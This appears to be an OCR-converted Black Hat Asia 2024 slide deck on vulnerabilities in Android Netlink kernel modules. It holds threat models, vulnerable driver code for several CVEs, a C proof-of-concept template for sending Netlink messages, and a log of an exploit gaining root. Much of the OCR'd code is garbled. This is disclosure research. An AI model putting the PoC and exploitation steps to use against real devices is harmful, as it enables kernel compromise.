---
title: "LinkDoor A Hidden Attack Surface in the Android Netlink Kernel Modules"
speakers: ["Chao Ma", "Han Yan", "Tim Xia"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Chao Ma & Han Yan & Tim Xia-LinkDoor A Hidden Attack Surface in the Android Netlink Kernel Modules.pdf"
pages: 39
sha256: "2778006e4c945abd4a18047e51f2277dfd43d83bda0178581c7e07ba6e537dd7"
text_chars: 17566
ocr_pages: 13
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:48:54Z"
---
# LinkDoor A Hidden Attack Surface in the Android Netlink Kernel Modules

**Speakers:** Chao Ma, Han Yan, Tim Xia  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Chao Ma & Han Yan & Tim Xia-LinkDoor A Hidden Attack Surface in the Android Netlink Kernel Modules.pdf` (39 pages)


## Slide 1

# LinkDoor: A Hidden Attack Surface in the Android Netlink Kernel Modules

Chao Ma, Han Yan, Tim Xia Baidu AIoT Security Team

#BHASIA @BlackHatEvents

## Slide 2

## About us

#### **Baidu AIoT Security Team**

- Focus on Android / Linux platform

- Aim to discover 0day vulnerability and explore possible defenses

#### **Members**

- Chao Ma (machao2019@gmail.com)

- Han Yan (yanhan05@baidu.com)

- Tim Xia (xialiangzhao@baidu.com)

## Slide 3

## Agenda

- Introduction

- Attack Surface Analysis

- Case Study

- PoC and Exploitation

- Conclusion

## Slide 4

## Introduction

- Background of Netlink

- Programming model of Classic Netlink

- Flaws of Classic Netlink

- Programming model of Generic Netlink

## Slide 5

## Introduction

#### **Background of Netlink**

- Mainly used for bidirectional communication between the kernel and user-space processes

- Support full-duplex, asynchronous and multicast communication

- Two categories in usage: Classic Netlink and Generic Netlink

## Slide 6

## Introduction

#### **Programming model of Classic Netlink**

- (Classic) Netlink socket is supported since 1999 with Linux 2.2

- The programming model

## Slide 7

## Introduction

#### **Flaws of Classic Netlink**

- Limited number of Netlink protocol

- • Complex usage

### Generic Netlink

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Introduction
Flaws of Classic Netlink
¢ Limited number of Netlink protocol st@tic intine struct sock *
netlink_kernel_create(struct net *net,
int unit
° Complex Usage oo eet fetlink kernel_cfg “cfg)
#define MAX_LINKS 32
#define NLMSG_ALIGNTO 4U
#define NLMSG_ALIGN(len) ( ((len)+NLMSG ALIGNTO-1) & ~(NLMSG_ALIGNTO-1) )
#define NLMSG_HDRLEN ((int) NLMSG_ALIGN(sizeof(struct nlmsghdr)))
#define NLMSG_LENGTH(len) ((len) + NLMSG HDRLEN)
#define NLMSG_SPACE(len) NLMSG_ALIGN(NLMSG_LENGTH(len) )
#define NLMSG_DATA(nlh) ((void *)(((char *)nlh) + NLMSG_HDRLEN) )
#define NLMSG_NEXT(nlh,len) ((len) -= NLMSG_ALIGN((nlh)->nlmsg_len), \
(struct nlmsghdr *)(((char *)(nlh)) + \
NLMSG_ALIGN((n1h)->nlmsg len) ) )
j j #define NLMSG_OK(nlh,len) ((len) >= (int)sizeof(struct nlmsghdr) && \
Generic Netlink (nlh)->nlmsg len >= sizeof(struct nlmsghdr) && \
(nih)->nlmsg len <= (len))
#define NLMSG_PAYLOAD(nlh,len) ((nlh)->nlmsg_len - NLMSG_SPACE((len)) )
```

## Slide 8

## Introduction

#### **Programming model of Generic Netlink**

- Generic Netlink socket is supported since 2006 with Linux 2.6.15

- The programming model

## Slide 9

## Attack Surface Analysis

- Netlink architecture

- Kernel mechanism of Classic Netlink

- Threat model  of Classic Netlink

- Kernel mechanism of Generic Netlink

- Threat model  of Generic Netlink

## Slide 10

## Attack Surface Analysis

#### **Netlink architecture**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Attack Surface Analysis
Netlink architecture
| | App-3 | ie
App-2
’ (libnl)
App-1 |
I “t Protocol Library Su
a ne eee
eS
Linux Kernel Netlink Subsystem |
User Space
—
: 25 25
oO
Oo
a
© (— Classic Netlink >) Generic Netlink >)
o
= Routing Netfilter IPv4/IPv6 KSMBD
Uevent a Wireless
| y - h
```

## Slide 11

## Attack Surface Analysis

#### **Kernel mechanism of Classic Netlink**

- Transfer Message Format

- nlmsg_len    : sizeof(nlmsghdr + pad + payload + pad)

- nlmsg_type : message content type

- nlmsg_flags : additional flag

- nlmsg_seq : sequence number

- nlmsg_pid : sending process port id

## Slide 12

## Attack Surface Analysis

**Kernel mechanism of Classic Netlink**

• Parsing Transfer Message

Check Nothing!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Attack Surface Analysis
Kernel mechanism of Classic Netlink
¢ Parsing Transfer Message
To: struct sk_buff skb;
sendto/sendmsg | input
skb->data’
cee) baceenececeeeeeeeaceeeeseseeeseees ¥
nimsghdr pad nilmsghdr pad
payload pad Check Nothing! payload pad
```

## Slide 13

## Attack Surface Analysis

#### **Threat model  of Classic Netlink**

- Top-down: attack the parsing of Classic Netlink

messages received from user space

- Attack-1: check the skb->len, nlh->nlmsg_len and NLMSG_HDRLEN  ===>  NLMSG_OK

- Attack-2: check the length of payload

- Attack-3: check the parsing of payload content

## Slide 14

## Attack Surface Analysis

#### **Threat model  of Classic Netlink**

- Bottom-up: attack the building of Classic Netlink

   - messages sending to user space

- Classic Netlink + file_operations (ioctl/write/…)

- Classic Netlink + socket (tcp/…)

- Classic Netlink + …

## Slide 15

## Attack Surface Analysis

#### **Kernel mechanism of Generic Netlink (based on Classic Netlink )**

- Transfer Message Format

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Attack Surface Analysis
Kernel mechanism of Generic Netlink (based on Classic Netlink )
¢ Transfer Message Format
nimsghdr pad payload pad nilmsghdr
genlmsghdr pad| family header pad attributes
cmd(1B) | version(1B) reserved(2B) attribute attribute attribute
nlattr pad attr payload pad
nla_len(2B) |nla_type(2B)
```

## Slide 16

## Attack Surface Analysis

#### **Kernel mechanism of Generic Netlink**

- Transfer Message Format

#### struct genlmsghdr

#### struct nlattr

- cmd : generic netlink command

   - nla_len : sizeof(nlattr + pad + attr payload + pad)

- version    : generic netlink version

   - nla_type : attribute type

- reserved : reserved field

## Slide 17

## Attack Surface Analysis

Kernel mechanism of Generic Netlink

• Parsing Transfer Message

Check by nla_policy!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Attack Surface Analysis
Kernel mechanism of Generic Netlink
¢ Parsing Transfer Message
sendto/sendmsg
v
To: struct genl_info info;
nimsghdr pad
genlmsghdr
pad
family header
pad
nlattr pad
attr payload
pad
niattr pad
attr payload
pad
.diot
i nfo->attrs[nla_typel;
v
nlattr
pad
attr payload
pad
nlattr
pad
attr payload
pad
```

## Slide 18

## Attack Surface Analysis

#### **Kernel mechanism of Generic Netlink**

- Parsing Transfer Message

#### struct nla_policy

- type            : data type of attribute

- len : type specific length of attr payload

- union { … } : validation union

## Slide 19

## Attack Surface Analysis

#### **Threat model  of Generic Netlink**

- Top-down: attack the parsing of Generic Netlink attributes received from user space

- Attack-1: check the settings of attribute policy

- Attack-2: check the validity of each attribute

- Attack-3: check the parsing of attribute payload

## Slide 20

## Attack Surface Analysis

#### **Threat model  of Generic Netlink**

- Bottom-up: attack the building of Generic Netlink attributes sending to user space

- Generic Netlink + file_operations (ioctl/write/…)

- - Generic Netlink + socket (tcp/…)

- Generic Netlink + …

## Slide 21

## Case Study

- Vulnerabilities statistics

- Case study 1: attack the parsing of Classic Netlink message

- Case study 2: attack the building of Classic Netlink message

- Case study 3: attack the parsing of Generic Netlink attributes

- Case study 4: attack the building of Generic Netlink attributes

## Slide 22

## Case Study

#### **Vulnerabilities statistics (up to 2024/04/15)**

- Number and Classification

- Distribution

#### • 4 vendors, 19 CVEs, 19 confirmed, all fixed

## Slide 23

## Case Study

**Case study 1: attack the parsing of Classic Netlink message**

- CVE-2023-32880 (NETLINK_FGD OOB Read)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Case Study
Case study 1: attack the parsing of Classic Netlink message
¢ CVE-2023-32880 (NETLINK_FGD OOB Read)
| static void mtk_gauge_netlink_handler (struct sk_buff *skb)
®
s) sendto(req) f
a mtk_battery_netlink_handler(skb);
7) }
+ 2
g static int bat_create_netlink(struct platform device *pdev)
; {
ie Send Netlink Message-. struct m{6375_priv *priv = platform_get_drvdata(pdev);
Oo struct mtk_ gauge *gauge = &priv->gauge;
a struct n¢tlink kernel cfg cfg = {
” input = mtk_gauge_netlink_ er,
3 1h }3 1
a
es j gauge->gm->mtk_battery_sk =
Q -input(skb) netlink_kernel_create(&init_net, NETLINK_FGD, &cfg);
```

## Slide 24

## Case Study

#### **Case study 1: attack the parsing of Classic Netlink message**

- CVE-2023-32880

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Case Study
Case study 1: attack the parsing of Classic Netlink message
¢* CVE-2023-32880
void mtk_battery_netlink_handler(struct sk buff *skb) | static void mtk_battery_daemon_handler(struct mtk_battery *gm,
{ void *nl_data, struct fgd_nl_msg t *ret_msg)
nee {
ae wae 4
nlh
(struct nlmsghdr *)skb->data;
i NETLEWK_CREDS(skb) ->pid; msg = nl_data;
vid = sagen ad A rat_msg->nl_cmd = msg->nl_cmd;
seq = nlh-> msg seq; - ret_msg->fgd_cmd = msg->fgd_cmd;
~ 3 os ’
data_= NLMSG_DATA(nlh);
3
| DAEMON_CMD_SET_FG BAT_INT1_GAP:
mtk_battery_daemon_handler(gm, data, fgd_ret_msg);
mtk_battery_send_to_user(gm, seq, fgd_ret_msg); int\fg_coulomb = 9;
fg _chulomb = gauge_get_int_property(GAUGE_PROP_COULOMB) ;
memcpy &gm->coulomb_int_gap,
&msg->fgd_data[@], sizeof(gm->coulomb_int_gap));
```

## Slide 25

## Case Study

#### **Case study 1: attack the parsing of Classic Netlink message**

- Root Cause Analysis

- Attack-1: check the skb->len, nlh->nlmsg_len and NLMSG_HDRLEN  ===>  NLMSG_OK

- Attack-2: check the length of payload

- Reflection: are all the out-of-bounds read data located in the receive buffer?

- setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size))  ===>  2304B (not fixed)

- Carefully construct payloads to fill the receive buffer

## Slide 26

## Case Study

**Case study 2: attack the building of Classic Netlink message**

- CVE-2024-20833 (NETLINK_FIPS_CRYPTO Use After Free)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Case Study
Case study 2: attack the building of Classic Netlink message
* CVE-2024-20833 (NETLINK_FIPS CRYPTO Use After Free)
process req to result
8 | ioctl(fd, DEK_ENCRYPT_DEK, arg) | | req = recvfrom() | > sendto(result) |
3
a Send ioctl Message --------- — ec): a eee ee Send Netlink Message --
®
@ _ . ; ;
8 ‘Teq = request_alloc() [ nlmsg_unicast(req) | request_wait_answer(req) <1 .input(skb)
: | / |
f.
o
<
‘request_send(&g | pub_crypto_control, req) | | request_free(&g_pub_crypto_control, req) |
```

## Slide 27

## Case Study

#### **Case study 2: attack the building of Classic Netlink message**

- CVE-2024-20833

- Root Cause Analysis

- Classic Netlink + ioctl

- Unprotected global variable

## Slide 28

## Case Study

#### **Case study 3: attack the parsing of Generic Netlink attributes**

- CVE-2024-26811 (Linux Kernel ksmbd smb2_read_pipe OOB Read)

## Slide 29

## Case Study

#### **Case study 3: attack the parsing of Generic Netlink attributes**

- CVE-2024-26811

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Case Study
Case study 3: attack the parsing of Generic Netlink attributes
* CVE-2024-26811
static int handle_generic_event(struct sk buff *skb,
struct genl info *info)
{
void *payload;
int sz;
int type = info->genllhdr->cmd;
if (type >= KSMBD_EVENT_MAX) {
WARN_ON(1);
return -EINVAL; 4
if (!info->attrs[typel])
return -EINVAL;
¥
payload = nla_data(info->attrs[info->genlhdr->cmd]) 5
sz = nla_len(info->attrs[info->genlhdr->cmd]);
return handle _response(type, payload, sz);
} « end handle_generic_event »
static int handle_response(int type, void “payload, size t sz)
{
unsigned int handle = *(unsigned int *)payload;
struct ipc_msg table entry *entry;
int ret = @;
down_read(&ipc_msg table lock);
hash_for_each_possible(ipc_msg table, ent/y, ipc_table hlist, handle) {
if (handle != entry->handle)
continue;
entry->response = kvzalloc(sz, G
if (!entry->response) {
ret = -ENOMEM;
break;
KERNEL);
memcpy(entry->response, payload, sz);
wake_up_interruptible(&entry->wait) ;
```

## Slide 30

## Case Study

#### **Case study 3: attack the parsing of Generic Netlink attributes**

- CVE-2024-26811

- Root Cause Analysis

- Generic Netlink + tcp

- Attack-3: check the parsing of attribute content

## Slide 31

## Case Study

#### **Case study 4: attack the building of Generic Netlink attributes**

- CVE-2023-52103 (Driver flp OOB Read)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Case Study
Case study 4: attack the building of Generic Netlink attributes
¢ CVE-2023-52103 (Driver flo OOB Read)
( static int Flp_generate_netlink_packet(struct flp_port_t *flp_port,
g | write(fd, buf, size) | | recvfrom() , const char *buf, unsigned int count, unsigned char cmd_type)
oO nr struct sk_buff *skb = NULL;
Ag struct nlmsghdr *nlh = NULL;
o void *msg_header = NULL;
3 char *data = NULL;
reennnennens Send write Message------------------- Receive Netlink Message- i as ;
2 static unsigned int flp_event_seqnum;
&
” skb = genlmsg_new((size _t)count, GFP_ATOMIC) ;
0) v if (skb == NULL)
gS : return -ENOMEM;
G flp_write() oe genlmsg_unicast() ,
/* add the genetlink message header */
msg header = genlmsg_put(skb, @, flp_event_seqnum++,
&flp_genl_family, @, cmd_type);
/* fill the data */
data = nla_reserve_nohdr(skb, (int)count);
/* send unicast genetlink message */
result = genlmsg _unicast(&init_net, skb, flp_port->portid);
```

## Slide 32

## Case Study

#### **Case study 4: attack the building of Generic Netlink attributes**

- CVE-2023-52103

- Root Cause Analysis

- Generic Netlink + write

- Unchecked validity of input data

## Slide 33

## PoC and Exploitation

- PoC of Classic Netlink

- PoC of Generic Netlink

- Exploitation

## Slide 34

## PoC and Exploitation

#### **PoC of Classic Netlink**

- Resolve the source port occupation problem

- Using getpid() as port in multi-process

- Try different port to bind() in multi-thread

- PoC template

## Slide 35

## PoC and Exploitation

#### **PoC of Generic Netlink**

- Resolve the Family ID acquisition problem

- PoC template

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PoC and Exploitation
PoC of Generic Netlink
¢ Resolve the Family ID acquisition problem
struct nlmsghdr:
u32 nlmsg_len:
ul6 nlmsg_ type:
__u16 nilmsg_ flags:
__u32 nlmsg_seq:
u32 nlmsg_pid:
struct genlmsghdr:
__u8 cmd:
__u8 version:
__ui16 reserved:
struct nlattr:
__u16 nla_len:
__u16 nla_type:
char data:
(padding: )
char data:
32
GENL_ID_CTRL
NLM_F_REQUEST | NLM_F_ACK
1
@
CTRL_CMD_GETFAMILY
2 /* or 1, doesn't matter
(2)
10
CTRL_ATTR_FAMILY_NAME
test1\0
f
wre Family Name
LY <2)
// (2)
// (3)
si
// (4)
¢ PoC template
int main(int argc, char **argv)
{
struct sockaddr_nl sre_addr, dest_addr;
struct nimsghdr *nlh = NULL;
int sock_fd, retval;
int family_id = 0;
char *attr_payload = NULL;
sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
memset (&src_addr, @, sizeof(src_addr));
src_addr.nl_family = AF_NETLINK;
src_addr.nl_pid = NETLINK_PID;
src_addr.nl_groups = @;
retval = bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
family_id = genl_get_family_id(sock_fd, GENL_FAMILY_NAME);
attr_payload =(char*)malloc(MAX_MSG_SIZE);
memset(attr_payload, @, MAX_MSG SIZE);
*(int32_t *)attr_payload = exff;
retval = genl_send_msg(sock fd, family_id, NETLINK_PID, GENL_CMD, GENL_VERSION,
ATTR_TYPE, (void *)attr_payload, sizeof(int32_t));
memset(attr_payload, @, MAX_MSG SIZE);
genl_rcv_msg(family_ id, sock_fd, attr_payload);
```

## Slide 36

## PoC and Exploitation

#### **PoC of Generic Netlink**

- PoC template

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PoC and Exploitation
static int genl_get_family_id(int sock_fd, char *family_name)
{
PoC of Generic Netlink
msgtemplate t ans;
int id, fe;
struct nlattr *na;
int rep_len;
rc = genl_send_msg(sock_fd, GENL_ID CTRL, @, CTRL_CMD GETFAMILY, 1,
¢ PoC template
int genl_send_msg(int sock fd, u_intie_t family id, u_int32_t nlmsg pid,
u_ints_t genl_cmd, u_ints_t genl_ version, u_int16_t nla _type,
void *nla_data, int nla len)
struct nlattr *na;
struct sockaddr_nl dst_addr;
int r, buflen;
char *buf;
msgtemplate_t msg;
memset (&dst_addr, @, sizeof(dst_addr));
dst_addr.nl_family = AF_NETLINK;
dst_addr.nl_pid = @;
dst_addr.nl_groups = @;
msg.nlh.nlmsg len = NLMSG_LENGTH(GENL_HDRLEN) ;
msg.nlh.nlmsg type = family_id;
msg.nlh.nlmsg flags = NLM_F_REQUEST;
msg.nlh.nlmsg seq = @3
msg.nlh.nlmsg pid = nlmsg_pid;
msg.gnlh.cmd = genl_cmd;
msg.gnlh.version = genl_version;
na = (struct nlattr *) GENLMSG_DATA(&msg) ;
na->nla_type = nla_type;
na->nla_len = nla_len + 1 + NLA_HDRLEN;
memcpy(NLA_DATA(na), nla_data, nla_len);
msg.nlh.nlmsg len += NLMSG_ALIGN(na->nla_len);
buf = (char *) &msg3;
buflen = msg.nlh.nlmsg_ len;
while C(r = sendto(sock_fd, buf, buflen, @, (struct sockaddr *) &dst_addr
» sizeof(dst_addr))) < buflen) {
if (r > @) {
buf += r3
buflen -= r3;
} else if (errno != EAGAIN) {
return -1;
}
CTRL_ATTR_FAMILY_NAME, (void *)family_name,
strlen(family_name)+1) ;
rep_len = recv(sock_fd, &ans, sizeof(ans), @);
na = (struct nlattr *) GENLMSG_DATA(&ans);
il]
na = (struct nlattr *) ((char *) na + NLA_ALIGN(na->nla_len));
if (na->nla_type == CTRL_ATTR_FAMILY_ID) {
id = *(__u16 *) NLA_DATA(na);
} else {
id = '@;
return id;
} « end genl_get_family_id »
void genl_rev_msg(int family id, int sock_fd, char *buf)
{
int ret;
struct msgtemplate msg;
struct nlattr *na;
ret = recv(sock_fd, &msg, sizeof(msg), 0);
if (msg.nlh.nlmsg type == family_id && family_id != @) {
na = (struct nlattr *) GENLMSG_DATA(&msg) ;
strncpy(buf, (char *)NLA_DATA(na), MAX_MSG SIZE);
```

## Slide 37

## PoC and Exploitation

#### **Exploitation**

- CVE-2023-32878 (Arbitrary Read)

- CVE-2023-32882 (Write-What-Where)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PoC and Exploitation
Exploitation
¢* CVE-2023-32878 (Arbitrary Read)
* CVE-2023-32882 (Write-What-Where)
qy12:/data/local/tmp $ id
uid=2000(shell) gid=200@(shell) groups=2000(shell) ,1004(input) ,1007(1log) ,1011(adb) ,1015(sdcar
d_rw) ,1028(sdcard_r) ,1078(ext_data_rw) ,1079(ext_obb_rw) ,3001(net_bt_admin) ,3002(net_bt) ,3003(
inet) ,3006(net_bw_stats) ,3009(readproc) ,3011(uhid) ,3012(readtracefs) context=u:r:shell:s@
qy12:/data/local/tmp $ getenforce
Permissive
qy12:/data/local/tmp $ ./exp
[+] Pwn start
[+] Search task_struct address ... ok
[+] Get cred address ... ok
[+] Write cred ... ok
[+] Pwn end
qy12:/data/local/tmp # id
uid=@(root) gid=@(root) groups=@(root) ,1004(input) ,1007(1log) ,1011(adb) ,1015(sdcard_rw) ,1028(s
dcard_r) ,1078(ext_data_rw) ,1079(ext_obb_rw) ,3001(net_bt_admin) ,3002(net_bt) ,3003(inet) ,3006(n
et_bw_stats) ,3009(readproc) ,3011(uhid) ,3012(readtracefs) context=u:r:shell:s@
```

## Slide 38

## Conclusion

#### **Summary**

- Netlink is a hidden attack surface buried deep in the Android ecosystem

- When customizing Classic Netlink, kernel will do no checks on Netlink messages

- When customizing Generic Netlink, kernel will do checks by attribute policy

- Generic Netlink does more than Classic Netlink, but it also introduces new secure threats

#### **Suggestions for vendors**

- Try to customization using Generic Netlink instead of Classic Netlink

- Understand Netlink mechanism and APIs before using them

## Slide 39

Thanks for your listening!
